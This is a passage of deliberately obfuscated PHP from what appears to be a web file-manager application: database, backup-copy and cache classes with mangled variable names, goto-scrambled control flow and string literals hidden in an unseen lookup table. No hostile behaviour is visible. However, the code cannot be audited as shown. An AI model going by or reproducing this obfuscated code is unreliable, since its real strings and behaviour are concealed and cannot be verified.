!preg_match($aââŸ—™Øé[820], $cÁû®Ç•öÆ)) { $cÁû®Ç•öÆ = $aââŸ—™Øé[821] . trim($cÁû®Ç•öÆ, $aââŸ—™Øé[821]) . $aââŸ—™Øé[821]; } return $cÁû®Ç•öÆ; } } class DbMysqli extends Db { public function __construct($Cë°¯…ÂÏæ = '') { $Dù∂âô≈Ëü =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!extension_loaded($Dù∂âô≈Ëü[822])) { think_exception(think_lang($Dù∂âô≈Ëü[10]) . $Dù∂âô≈Ëü[823]); } if (!empty($Cë°¯…ÂÏæ)) { $this->config = $Cë°¯…ÂÏæ; if (empty($this->config[$Dù∂âô≈Ëü[13]])) { $this->config[$Dù∂âô≈Ëü[13]] = $Dù∂âô≈Ëü[33]; } } } public function connect($C—Ø•Í–‹◊ = '', $e√…◊‹èÃ€ = 0) { $f»âùëëà◊ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!isset($this->linkID[$e√…◊‹èÃ€])) { goto EäÙ†ﬂêØ; E¥‚°»¡ªÛ: $this->connected = !0; if (1 != think_config($f»âùëëà◊[18])) { unset($this->config); } goto Eú†◊ÒÌˆ; EäÙ†ﬂêØ: if (empty($C—Ø•Í–‹◊)) { $C—Ø•Í–‹◊ = $this->config; } $this->linkID[$e√…◊‹èÃ€] = new mysqli($C—Ø•Í–‹◊[$f»âùëëà◊[796]], $C—Ø•Í–‹◊[$f»âùëëà◊[798]], $C—Ø•Í–‹◊[$f»âùëëà◊[799]], $C—Ø•Í–‹◊[$f»âùëëà◊[17]], $C—Ø•Í–‹◊[$f»âùëëà◊[797]] ? intval($C—Ø•Í–‹◊[$f»âùëëà◊[797]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto bÌ¶ñ∑œ·ß; bÌ¶ñ∑œ·ß: $AºÒ”‚≥Ñı = $this->linkID[$e√…◊‹èÃ€]->server_version; $this->linkID[$e√…◊‹èÃ€]->query($f»âùëëà◊[800] . think_config($f»âùëëà◊[801]) . $f»âùëëà◊[55]); if ($AºÒ”‚≥Ñı > $f»âùëëà◊[802]) { $this->linkID[$e√…◊‹èÃ€]->query($f»âùëëà◊[803]); } goto E¥‚°»¡ªÛ; Eú†◊ÒÌˆ: } return $this->linkID[$e√…◊‹èÃ€]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($CœæÙ∏ñ«á) { goto f…Ø⁄â€óÓ; eèÜ≈âˆÜö: think_status($B¡ ‹√£ä‹[20]); $this->queryID = $this->_linkID->query($CœæÙ∏ñ«á); if ($this->_linkID->more_results()) { while (($Bˆ«¬ã¯°◊ = $this->_linkID->next_result()) != NULL) { $Bˆ«¬ã¯°◊->free_result(); } } goto A·∞íâ¬√Ò; FÌ–ûı‚È«: $this->queryStr = $CœæÙ∏ñ«á; if ($this->queryID) { $this->free(); } think_action_status($B¡ ‹√£ä‹[19], 1); goto eèÜ≈âˆÜö; f…Ø⁄â€óÓ: $B¡ ‹√£ä‹ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto FÌ–ûı‚È«; A·∞íâ¬√Ò: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto E…∂á‘ê°ú; E…∂á‘ê°ú: } public function execute($CÉà”Á‰üŸ) { goto f¬ï≠õÖÇ÷; bÛÀ˘≥¥û£: $this->queryStr = $CÉà”Á‰üŸ; if ($this->queryID) { $this->free(); } think_action_status($dÎ°≤ﬁé»Ç[21], 1); goto Dﬁ´Û§ºÊÃ; f¬ï≠õÖÇ÷: $dÎ°≤ﬁé»Ç =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bÛÀ˘≥¥û£; Dﬁ´Û§ºÊÃ: think_status($dÎ°≤ﬁé»Ç[20]); $B˜áÉõΩ—ª = $this->_linkID->query($CÉà”Á‰üŸ); $this->debug(); goto c∞öÊ∆¨ÌÜ; c∞öÊ∆¨ÌÜ: if (!1 === $B˜áÉõΩ—ª) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto B°ΩÒÌçÆ‘; B°ΩÒÌçÆ‘: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $e¢–µáòµÑ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$e¢–µáòµÑ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Cªƒ„ﬂäº‡ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Cªƒ„ﬂäº‡) { $this->error(); return !1; } } return !0; } private function getAll() { $Dà’è™á≥Ç = array(); if ($this->numRows > 0) { for ($eöÎ≈Ñ∆ﬂ± = 0; $eöÎ≈Ñ∆ﬂ± < $this->numRows; $eöÎ≈Ñ∆ﬂ±++) { $Dà’è™á≥Ç[$eöÎ≈Ñ∆ﬂ±] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Dà’è™á≥Ç; } public function getFields($d¶ã∂É£Á⁄) { $E£≈À˘€£‚ =& $_SERVER[£¿ÌÙëü¡¯¯]; $cÀ®¯ÌÂπ = $this->query($E£≈À˘€£‚[807] . $this->parseKey($d¶ã∂É£Á⁄)); $Fêô¯Â‘… = array(); if ($cÀ®¯ÌÂπ) { foreach ($cÀ®¯ÌÂπ as $FÃ‘´≥í“° => $F√©î—∆Ç¥) { $Fêô¯Â‘…[$F√©î—∆Ç¥[$E£≈À˘€£‚[27]]] = array($E£≈À˘€£‚[28] => $F√©î—∆Ç¥[$E£≈À˘€£‚[27]], $E£≈À˘€£‚[29] => $F√©î—∆Ç¥[$E£≈À˘€£‚[30]], $E£≈À˘€£‚[31] => (bool) ($F√©î—∆Ç¥[$E£≈À˘€£‚[32]] === $E£≈À˘€£‚[33]), $E£≈À˘€£‚[34] => $F√©î—∆Ç¥[$E£≈À˘€£‚[35]], $E£≈À˘€£‚[36] => strtolower($F√©î—∆Ç¥[$E£≈À˘€£‚[37]]) == $E£≈À˘€£‚[38], $E£≈À˘€£‚[39] => strtolower($F√©î—∆Ç¥[$E£≈À˘€£‚[40]]) == $E£≈À˘€£‚[41]); } } return $Fêô¯Â‘…; } public function getTables($F°Éà·°°ù = '') { $AßÒÌÜëè‹ =& $_SERVER[£¿ÌÙëü¡¯¯]; $BÛ›õÎó¢ñ = !empty($F°Éà·°°ù) ? $AßÒÌÜëè‹[809] . $F°Éà·°°ù : $AßÒÌÜëè‹[810]; $CÂïû†ñ›é = $this->query($BÛ›õÎó¢ñ); $Aêó∆∂´Ó≥ = array(); if ($CÂïû†ñ›é) { foreach ($CÂïû†ñ›é as $F†≥â≠∫ñ¥ => $cÚ‰°ù£ãô) { $Aêó∆∂´Ó≥[$F†≥â≠∫ñ¥] = current($cÚ‰°ù£ãô); } } return $Aêó∆∂´Ó≥; } public function replace($c‰ˆÉæÛÓ, $f·Ú‹¶„ıÕ = array()) { $e“åàÇÜê∫ =& $_SERVER[£¿ÌÙëü¡¯¯]; foreach ($c‰ˆÉæÛÓ as $E»çòŸ∆≤ => $C‰¯¯⁄ ¨ﬂ) { $FÙﬁå£Ã»‚ = $this->parseValue($C‰¯¯⁄ ¨ﬂ); if (is_scalar($FÙﬁå£Ã»‚)) { $aá√çõ÷ÂË[] = $FÙﬁå£Ã»‚; $eÏ°†Òœ÷§[] = $this->parseKey($E»çòŸ∆≤); } } $aâåûÑ∫Á¥ = $e“åàÇÜê∫[811] . $this->parseTable($f·Ú‹¶„ıÕ[$e“åàÇÜê∫[264]]) . $e“åàÇÜê∫[812] . implode($e“åàÇÜê∫[47], $eÏ°†Òœ÷§) . $e“åàÇÜê∫[813] . implode($e“åàÇÜê∫[47], $aá√çõ÷ÂË) . $e“åàÇÜê∫[814]; return $this->execute($aâåûÑ∫Á¥); } public function insertAll($b™≥≥∂ÂÂÃ, $Bªóë¢Œæπ = array(), $D∑ÈàõÈ¶“ = false) { goto F‚«øæª∞À; c¿“Ó–…Íò: $Cëƒ’ëÍò© = ($D∑ÈàõÈ¶“ ? $e¿ıê—ÀÎ“[816] : $e¿ıê—ÀÎ“[817]) . $e¿ıê—ÀÎ“[818] . $this->parseTable($Bªóë¢Œæπ[$e¿ıê—ÀÎ“[264]]) . $e¿ıê—ÀÎ“[812] . implode($e¿ıê—ÀÎ“[47], $EïáÖô—ÉÂ) . $e¿ıê—ÀÎ“[819] . implode($e¿ıê—ÀÎ“[47], $Fß€…†∑Ôê); return $this->execute($Cëƒ’ëÍò©); goto c’Û±ã˘°á; F‚«øæª∞À: $e¿ıê—ÀÎ“ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!is_array($b™≥≥∂ÂÂÃ[0])) { return !1; } $EïáÖô—ÉÂ = array_keys($b™≥≥∂ÂÂÃ[0]); goto B§ﬁÓáñ∫∞; B§ﬁÓáñ∫∞: $Fß€…†∑Ôê = array(); foreach ($b™≥≥∂ÂÂÃ as $F˘ô‰™çƒÂ) { $Fé◊§∑˜¡Ã = array(); foreach ($F˘ô‰™çƒÂ as $bËÂß„ì≠÷ => $B¬úÌÿí™’) { $B¬úÌÿí™’ = $this->parseValue($B¬úÌÿí™’); if (is_scalar($B¬úÌÿí™’)) { $Fé◊§∑˜¡Ã[] = $B¬úÌÿí™’; } } $Fß€…†∑Ôê[] = $e¿ıê—ÀÎ“[245] . implode($e¿ıê—ÀÎ“[47], $Fé◊§∑˜¡Ã) . $e¿ıê—ÀÎ“[814]; } array_walk($EïáÖô—ÉÂ, array($this, $e¿ıê—ÀÎ“[815])); goto c¿“Ó–…Íò; c’Û±ã˘°á: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $AÀ≤ƒ‹ê’Í =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->error = $this->_linkID->errno . $AÀ≤ƒ‹ê’Í[4] . $this->_linkID->error; if ($AÀ≤ƒ‹ê’Í[33] != $this->queryStr) { $this->error .= LNG($AÀ≤ƒ‹ê’Í[45]) . $this->queryStr; } think_trace($this->error, $AÀ≤ƒ‹ê’Í[33], $AÀ≤ƒ‹ê’Í[46]); return $this->error; } public function escapeString($c«©’ÃúãÉ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($c«©’ÃúãÉ); } else { return addslashes($c«©’ÃúãÉ); } } public function parseKey(&$DÛ¡É®ˆñ, $AÎô·ÀÇÊï = true) { $Cœó©ÀÆÀ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($AÎô·ÀÇÊï) { $DÛ¡É®ˆñ = $this->parseKeyCheck($DÛ¡É®ˆñ); } if ($DÛ¡É®ˆñ != $Cœó©ÀÆÀ[173] && !preg_match($Cœó©ÀÆÀ[820], $DÛ¡É®ˆñ)) { $DÛ¡É®ˆñ = $Cœó©ÀÆÀ[821] . trim($DÛ¡É®ˆñ, $Cœó©ÀÆÀ[821]) . $Cœó©ÀÆÀ[821]; } return $DÛ¡É®ˆñ; } } goto dƒ—ç»’∞∆; C¥Ï˜úœ® : class BackupFile { public function __construct() { } public function index() { goto E´Ïº èÌò; c…ñã‰◊ïÒ: $aôâòøÃ⁄é = (int) Model($_SERVER[£¿ÌÙëü¡¯¯][709])->where($eÆãÌ¨‹√ã)->count($_SERVER[£¿ÌÙëü¡¯¯][415]); $Bˆéù∫éã– = (int) Model($_SERVER[£¿ÌÙëü¡¯¯][709])->where($eÆãÌ¨‹√ã)->sum($_SERVER[£¿ÌÙëü¡¯¯][78]); $aÇœÈ·ÿç÷ = new TaskFileTransfer($_SERVER[£¿ÌÙëü¡¯¯][734], $_SERVER[£¿ÌÙëü¡¯¯][698], $aôâòøÃ⁄é, LNG($_SERVER[£¿ÌÙëü¡¯¯][699]) . $_SERVER[£¿ÌÙëü¡¯¯][700] . LNG($_SERVER[£¿ÌÙëü¡¯¯][735])); goto dıÇ´ªê÷¶; CãíπË¯Ç¨: $cπïà·˘∂¶ = $cßˆ‰å‹ê“ = 0; do { $D˘…∏¿ß⁄È = $_SERVER[£¿ÌÙëü¡¯¯][738]; $BÒôÉ£Æ‘ = Model($_SERVER[£¿ÌÙëü¡¯¯][709])->where($eÆãÌ¨‹√ã)->field($D˘…∏¿ß⁄È)->order($_SERVER[£¿ÌÙëü¡¯¯][739])->selectPage($Fûê‘éàìô, $d¢‡÷öó¥–); $AÖ–ÜºÇ∂˘ = !empty($BÒôÉ£Æ‘[$_SERVER[£¿ÌÙëü¡¯¯][350]]) ? $BÒôÉ£Æ‘[$_SERVER[£¿ÌÙëü¡¯¯][350]] : array(); foreach ($AÖ–ÜºÇ∂˘ as $f¯Ÿ‘‘æ∆°) { goto eÈû∫±íåà; eÈû∫±íåà: if (!$this->_fileExist($f¯Ÿ‘‘æ∆°, $bùÃ∑≤ï«á, $d„·˘Õ™ãƒ)) { $aôâòøÃ⁄é -= 1; $Bˆéù∫éã– -= (int) $f¯Ÿ‘‘æ∆°[$_SERVER[£¿ÌÙëü¡¯¯][78]]; write_log("\x66\151\154\145\x20\156\157\x74\x20\145\x78\x69\x73\164\56\146\x69\154\145\111\x44\x3a{$f¯Ÿ‘‘æ∆°[$_SERVER[£¿ÌÙëü¡¯¯][415]]}\x2c\x20\x70\141\164\150\x3a{$f¯Ÿ‘‘æ∆°[$_SERVER[£¿ÌÙëü¡¯¯][76]]}", $_SERVER[£¿ÌÙëü¡¯¯][740]); continue; } $Bﬁ¨ÑÔ§ Ò = $f¯Ÿ‘‘æ∆°[$_SERVER[£¿ÌÙëü¡¯¯][76]]; $F∞≥‹í√¿· = "\x7b\151\x6f\72{$b√≥…Ê¢ÒÁ[$_SERVER[£¿ÌÙëü¡¯¯][678]]}\x7d" . substr($Bﬁ¨ÑÔ§ Ò, strlen("\173\x69\157\72{$f¯Ÿ‘‘æ∆°[$_SERVER[£¿ÌÙëü¡¯¯][710]]}\x7d")); goto eŸœÔ ˆã¶; eŸœÔ ˆã¶: if (IO::exist($F∞≥‹í√¿·)) { $aÇœÈ·ÿç÷->updateFileEnd($f¯Ÿ‘‘æ∆°[$_SERVER[£¿ÌÙëü¡¯¯][28]], $f¯Ÿ‘‘æ∆°[$_SERVER[£¿ÌÙëü¡¯¯][78]]); } else { $F∞≥‹í√¿· = get_path_father($F∞≥‹í√¿·); IO::mkdir($F∞≥‹í√¿·); if (!IO::copy($Bﬁ¨ÑÔ§ Ò, $F∞≥‹í√¿·, $_SERVER[£¿ÌÙëü¡¯¯][741])) { write_log($_SERVER[£¿ÌÙëü¡¯¯][742] . $Bﬁ¨ÑÔ§ Ò . $_SERVER[£¿ÌÙëü¡¯¯][743] . $F∞≥‹í√¿· . $_SERVER[£¿ÌÙëü¡¯¯][468], $_SERVER[£¿ÌÙëü¡¯¯][698]); $Eî‘ƒÖ∞Éá = !1; break; } } $A¯éÚπ¥Óü = $f¯Ÿ‘‘æ∆°[$_SERVER[£¿ÌÙëü¡¯¯][415]]; $Aª⁄¯¬óìΩ += 1; goto bÍŸÇÏıØö; bÍŸÇÏıØö: $fä≈·’´ôü += $f¯Ÿ‘‘æ∆°[$_SERVER[£¿ÌÙëü¡¯¯][78]]; $cßˆ‰å‹ê“ += 1; $cπïà·˘∂¶ += $f¯Ÿ‘‘æ∆°[$_SERVER[£¿ÌÙëü¡¯¯][78]]; goto c¥Æ≈åíÓ≤; c¥Æ≈åíÓ≤: if ($fä≈·’´ôü >= 1024 * 1024 * 50) { $f¢Œû›ã¢√ = array($_SERVER[£¿ÌÙëü¡¯¯][744] => $A¯éÚπ¥Óü, $_SERVER[£¿ÌÙëü¡¯¯][745] => $cßˆ‰å‹ê“, $_SERVER[£¿ÌÙëü¡¯¯][746] => $cπïà·˘∂¶); Backup::set($f¢Œû›ã¢√); $fä≈·’´ôü = $Aª⁄¯¬óìΩ = 0; } goto f‹ËºÉπÖÔ; f‹ËºÉπÖÔ: } $DÒ—»‰âí∏ = count($AÖ–ÜºÇ∂˘); $d¢‡÷öó¥–++; } while ($DÒ—»‰âí∏ == $Fûê‘éàìô); $aÇœÈ·ÿç÷->end(); goto BΩﬂª›Çº∆; C„¿ˆ—´≥§: $Eî‘ƒÖ∞Éá = !0; $d„·˘Õ™ãƒ = $this->storeIds(); $d¢‡÷öó¥– = 1; goto d´¥±ﬂÃÎÑ; dıÇ´ªê÷¶: $aÇœÈ·ÿç÷->task[$_SERVER[£¿ÌÙëü¡¯¯][685]] = $Bˆéù∫éã–; $f¢Œû›ã¢√ = array($_SERVER[£¿ÌÙëü¡¯¯][736] => $aôâòøÃ⁄é, $_SERVER[£¿ÌÙëü¡¯¯][737] => $Bˆéù∫éã–); Backup::set($f¢Œû›ã¢√); goto C„¿ˆ—´≥§; E´Ïº èÌò: $b√≥…Ê¢ÒÁ = Backup::get(); $A¯éÚπ¥Óü = $b√≥…Ê¢ÒÁ[$_SERVER[£¿ÌÙëü¡¯¯][278]][$_SERVER[£¿ÌÙëü¡¯¯][164]][$_SERVER[£¿ÌÙëü¡¯¯][415]]; $eÆãÌ¨‹√ã = array($_SERVER[£¿ÌÙëü¡¯¯][416] => array($_SERVER[£¿ÌÙëü¡¯¯][732], $A¯éÚπ¥Óü), $_SERVER[£¿ÌÙëü¡¯¯][733] => array($_SERVER[£¿ÌÙëü¡¯¯][316], $b√≥…Ê¢ÒÁ[$_SERVER[£¿ÌÙëü¡¯¯][678]])); goto c…ñã‰◊ïÒ; BΩﬂª›Çº∆: $Eﬁª»∫áÂ„ = $Eî‘ƒÖ∞Éá ? 1 : 0; $f¢Œû›ã¢√ = array($_SERVER[£¿ÌÙëü¡¯¯][747] => 1, $_SERVER[£¿ÌÙëü¡¯¯][690] => time(), $_SERVER[£¿ÌÙëü¡¯¯][696] => $Eﬁª»∫áÂ„, $_SERVER[£¿ÌÙëü¡¯¯][744] => $A¯éÚπ¥Óü, $_SERVER[£¿ÌÙëü¡¯¯][737] => $Bˆéù∫éã–, $_SERVER[£¿ÌÙëü¡¯¯][736] => $aôâòøÃ⁄é); if ($Aª⁄¯¬óìΩ) { $f¢Œû›ã¢√[$_SERVER[£¿ÌÙëü¡¯¯][745]] = $cßˆ‰å‹ê“; $f¢Œû›ã¢√[$_SERVER[£¿ÌÙëü¡¯¯][746]] = $cπïà·˘∂¶; } goto aÖ∆€€Ò…è; d´¥±ﬂÃÎÑ: $Fûê‘éàìô = 1000; $fä≈·’´ôü = $Aª⁄¯¬óìΩ = 0; $bùÃ∑≤ï«á = array(); goto CãíπË¯Ç¨; aÖ∆€€Ò…è: Backup::set($f¢Œû›ã¢√); $this->_fileFilter($bùÃ∑≤ï«á); return !0; goto EÂ≈ä√öÖë; EÂ≈ä√öÖë: } private function _fileExist($CáÈ ÚÑûè, &$f»è¶±ÌπÉ, $A‰’ìÖæŒ°) { goto Fπœ≠Á≥ëÒ; A ‚ã‡Êá“: if (IO::exist($FÆ°ú®Ÿ∫Ω)) { $f»è¶±ÌπÉ[] = $CáÈ ÚÑûè[$B∆Ωí∑í¶ı[415]]; return !1; } $Bäœü“§ØÃ = array($B∆Ωí∑í¶ı[710] => $CáÈ ÚÑûè[$B∆Ωí∑í¶ı[710]], $B∆Ωí∑í¶ı[76] => array($B∆Ωí∑í¶ı[748], "{$FÆ°ú®Ÿ∫Ω}\45")); $eÕ‚ÁùäÃà = Model($B∆Ωí∑í¶ı[709])->where($Bäœü“§ØÃ)->field($B∆Ωí∑í¶ı[416])->select(); goto BåÜÊ›£®√; BÖæ”àä∫ö: if (!in_array($CáÈ ÚÑûè[$B∆Ωí∑í¶ı[710]], $A‰’ìÖæŒ°)) { return !1; } if (IO::exist($FÜê©Ñë å)) { return !0; } $FÆ°ú®Ÿ∫Ω = get_path_father($FÜê©Ñë å); goto A ‚ã‡Êá“; Fπœ≠Á≥ëÒ: $B∆Ωí∑í¶ı =& $_SERVER[£¿ÌÙëü¡¯¯]; $FÜê©Ñë å = $CáÈ ÚÑûè[$B∆Ωí∑í¶ı[76]]; if (in_array($CáÈ ÚÑûè[$B∆Ωí∑í¶ı[415]], $f»è¶±ÌπÉ)) { return !1; } goto BÖæ”àä∫ö; BåÜÊ›£®√: $f»è¶±ÌπÉ = array_merge($f»è¶±ÌπÉ, array_to_keyvalue($eÕ‚ÁùäÃà, $B∆Ωí∑í¶ı[33], $B∆Ωí∑í¶ı[415])); return !1; goto fâ» É˘∆˜; fâ» É˘∆˜: } private function _fileFilter($b‰‡…öﬁÉ÷) { $c€ﬁÓà±¢Ü =& $_SERVER[£¿ÌÙëü¡¯¯]; if (empty($b‰‡…öﬁÉ÷)) { return; } $cåÍ›Ùçÿò = array($c€ﬁÓà±¢Ü[415] => array($c€ﬁÓà±¢Ü[7], array_unique($b‰‡…öﬁÉ÷))); $dá¯¡Î≤‹„ = Model($c€ﬁÓà±¢Ü[749])->where($cåÍ›Ùçÿò)->field($c€ﬁÓà±¢Ü[366])->select(); foreach ($dá¯¡Î≤‹„ as $bﬁ∆ÏûóÈä) { Model($c€ﬁÓà±¢Ü[749])->remove($bﬁ∆ÏûóÈä[$c€ﬁÓà±¢Ü[366]], !1); } } private function storeIds() { $Aªπ†óÉƒ =& $_SERVER[£¿ÌÙëü¡¯¯]; $a∆ÛÎÜãÙÖ = Model($Aªπ†óÉƒ[691])->listData(); return array_to_keyvalue($a∆ÛÎÜãÙÖ, $Aªπ†óÉƒ[33], $Aªπ†óÉƒ[364]); } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto fì¥ƒ£ˆ¡∞; fì¥ƒ£ˆ¡∞: $aÒÕß÷È∑◊ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto CÙã¢‘·§¨; b¿Õ∞…ËËµ: switch ($d’ü•¨›ß«[$aÒÕß÷È∑◊[750]]) { case $aÒÕß÷È∑◊[17]: self::$handle = Model($aÒÕß÷È∑◊[752]); break; case $aÒÕß÷È∑◊[753]: self::$handle = new CacheRedis($f£∂âÑù›≠, $aÌÀ™ﬂÈä¶); break; case $aÒÕß÷È∑◊[754]: self::$handle = new CacheMemcached($f£∂âÑù›≠, $aÌÀ™ﬂÈä¶); break; case $aÒÕß÷È∑◊[164]: self::$handle = new CacheFile($f£∂âÑù›≠, $aÌÀ™ﬂÈä¶); break; default: break; } return self::$handle; goto DÊ·”¬éª; CÙã¢‘·§¨: $d’ü•¨›ß« = $GLOBALS[$aÒÕß÷È∑◊[6]][$aÒÕß÷È∑◊[334]]; $f£∂âÑù›≠ = $d’ü•¨›ß«[$d’ü•¨›ß«[$aÒÕß÷È∑◊[750]]]; $aÌÀ™ﬂÈä¶ = $d’ü•¨›ß«[$aÒÕß÷È∑◊[751]]; goto b¿Õ∞…ËËµ; DÊ·”¬éª: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($aïπÇÀÑùﬁ) { if (is_array($aïπÇÀÑùﬁ) || is_object($aïπÇÀÑùﬁ)) { $aïπÇÀÑùﬁ = json_encode($aïπÇÀÑùﬁ); } $aïπÇÀÑùﬁ = rawurlencode($aïπÇÀÑùﬁ); return KOD_SITE_ID . $_SERVER[£¿ÌÙëü¡¯¯][71] . $aïπÇÀÑùﬁ; } public static function get($cò˜ò¿¿µ≥) { $FåØ¥—ˆÈ = self::key($cò˜ò¿¿µ≥); if (!isset(self::$memoryCache[$FåØ¥—ˆÈ])) { CacheLock::lock($cò˜ò¿¿µ≥); $e∞Ûïç¿¯≤ = self::init()->get($FåØ¥—ˆÈ); CacheLock::unlock($cò˜ò¿¿µ≥); self::$memoryCache[$FåØ¥—ˆÈ] = unserialize($e∞Ûïç¿¯≤); } return self::$memoryCache[$FåØ¥—ˆÈ]; } public static function set($cõÓ™‹πûû, $e¿Ã™†Ñ√á, $B“Ó—Ò–ÍÚ = false) { goto C›ü…°∑¿®; aÛ⁄Ç¥¶ûÙ: CacheLock::unlock($cõÓ™‹πûû); return $f‚öØ„¬Û¶; goto E¯Êº∫≈áª; Fâ¥Ñ¥Ò–—: CacheLock::lock($cõÓ™‹πûû); $f‚öØ„¬Û¶ = self::init()->set($A≥”ÎÀ‹çá, serialize($e¿Ã™†Ñ√á), $B“Ó—Ò–ÍÚ); self::$memoryCache[$A≥”ÎÀ‹çá] = $e¿Ã™†Ñ√á; goto aÛ⁄Ç¥¶ûÙ; C›ü…°∑¿®: $A≥”ÎÀ‹çá = self::key($cõÓ™‹πûû); if (isset(self::$memoryCache[$A≥”ÎÀ‹çá]) && self::$memoryCache[$A≥”ÎÀ‹çá] === $e¿Ã™†Ñ√á) { return !0; } if ($B“Ó—Ò–ÍÚ === 0) { self::$memoryCache[$A≥”ÎÀ‹çá] = $e¿Ã™†Ñ√á; return !0; } goto Fâ¥Ñ¥Ò–—; E¯Êº∫≈áª: } public static function remove($fŒΩŸﬂ∂¿é) { goto FÆ¯Áƒππº; Aê´âË˜†Ì: return $bﬂØπ…ç√∆; goto BÏ„ì‡ªƒá; cﬁ¶á‡ÀÊÒ: CacheLock::lock($fŒΩŸﬂ∂¿é); $bﬂØπ…ç√∆ = self::init()->remove($eÇ ØÖ„ñ‘); CacheLock::unlock($fŒΩŸﬂ∂¿é); goto Aê´âË˜†Ì; FÆ¯Áƒππº: $eÇ ØÖ„ñ‘ = self::key($fŒΩŸﬂ∂¿é); unset(self::$memoryCache[$eÇ ØÖ„ñ‘]); self::clearTimeout(); goto cﬁ¶á‡ÀÊÒ; BÏ„ì‡ªƒá: } public static function clearMemory($dååÚô—·ß = false) { if ($dååÚô—·ß) { $dååÚô—·ß = self::key($dååÚô—·ß); unset(self::$memoryCache[$dååÚô—·ß]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[£¿ÌÙëü¡¯¯][755])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[£¿ÌÙëü¡¯¯][756])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($CÃ¥ıúÍì•, $CœÊ˘óı≠§) { $bŒµŒÕ¶î∂ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->cachePath = $CÃ¥ıúÍì•[$bŒµŒÕ¶î∂[76]]; $this->prefix = $bŒµŒÕ¶î∂[757]; $this->cacheTime = $CœÊ˘óı≠§; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($cõÑá™Ÿ°÷) { $BÆå«øÔ¿« =& $_SERVER[£¿ÌÙëü¡¯¯]; $cõÑá™Ÿ°÷ = str_replace(array($BÆå«øÔ¿«[725], $BÆå«øÔ¿«[96], $BÆå«øÔ¿«[70]), $BÆå«øÔ¿«[758], $cõÑá™Ÿ°÷); return $this->cachePath . $BÆå«øÔ¿«[759] . $cõÑá™Ÿ°÷ . $BÆå«øÔ¿«[760]; } public function set($Fπ±¡©™åÖ, $Cñ”íÈÁúê, $b È´ƒœπ… = false) { $FòÚ∑‘¶Ù‡ = $this->getFile($Fπ±¡©™åÖ); if (file_put_contents($FòÚ∑‘¶Ù‡, $this->prefix . $Cñ”íÈÁúê, LOCK_EX)) { return !0; } @unlink($FòÚ∑‘¶Ù‡); return !1; } public function get($FÌ∑Óä„–¶) { $fõ≠¯À®‘Ø = $this->getFile($FÌ∑Óä„–¶); if (file_exists($fõ≠¯À®‘Ø) && filemtime($fõ≠¯À®‘Ø) < time() - $this->cacheTime) { @unlink($fõ≠¯À®‘Ø); return !1; } $e◊ÜµÕ⁄æ = @file_get_contents($fõ≠¯À®‘Ø); return substr($e◊ÜµÕ⁄æ, strlen($this->prefix)); } public function remove($CÏÍ€µêÑÑ) { $c∆‘äóñºÏ = $this->getFile($CÏÍ€µêÑÑ); return @unlink($c∆‘äóñºÏ); } public function deleteAll() { $C«ÜÍÔ°Öª =& $_SERVER[£¿ÌÙëü¡¯¯]; $E≈ÙÙ¨¡◊Ë = scandir($this->cachePath); foreach ($E≈ÙÙ¨¡◊Ë as $EçÍ„ÏùÖÊ) { $B‘ƒ“ùÌ©ü = $this->cachePath . $EçÍ„ÏùÖÊ; if (strpos($B‘ƒ“ùÌ©ü, $C«ÜÍÔ°Öª[760]) && strpos($B‘ƒ“ùÌ©ü, $C«ÜÍÔ°Öª[761])) { @unlink($B‘ƒ“ùÌ©ü); } } } public function clearTimeout() { $F¿ﬂ÷ˆéê“ =& $_SERVER[£¿ÌÙëü¡¯¯]; $A‚œòìêÕ§ = scandir($this->cachePath); foreach ($A‚œòìêÕ§ as $E«ÔÏ¥ê÷‚) { $A¬¨Ó∏ö∂á = $this->cachePath . $E«ÔÏ¥ê÷‚; if (strpos($A¬¨Ó∏ö∂á, $F¿ﬂ÷ˆéê“[760]) && strpos($A¬¨Ó∏ö∂á, $F¿ﬂ÷ˆéê“[761]) && filemtime($A¬¨Ó∏ö∂á) < time() - $this->cacheTime) { @unlink($A¬¨Ó∏ö∂á); } } } } goto Câ®«”∆¡Ï; a©∫°∏ùº‘: class KodIO { const KOD_SOURCE = "\173\163\157\x75\x72\143\145\x7d"; const KOD_USER_RECYCLE = "\173\165\163\x65\162\x52\x65\x63\x79\x63\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\165\163\145\x72\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\165\163\x65\162\106\x69\154\x65\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\x65\162\x46\151\x6c\x65\124\x79\160\145\x7d"; const 